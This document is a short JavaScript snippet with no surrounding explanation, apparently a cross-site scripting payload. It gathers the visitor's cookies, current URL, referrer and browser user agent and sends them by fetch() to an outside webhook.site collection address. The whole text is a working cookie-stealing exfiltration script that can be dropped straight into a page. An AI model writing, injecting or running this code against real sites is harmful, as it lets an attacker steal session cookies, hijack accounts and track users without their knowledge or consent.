(function () {
  const endpoint = 'https://webhook.site/4e27c3b8-ea10-40a9-a816-ac1d92350386';

  const info = {
    cookie: document.cookie,
    location: location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
  };

  fetch(`${endpoint}?info=${encodeURIComponent(JSON.stringify(info))}`);
})();
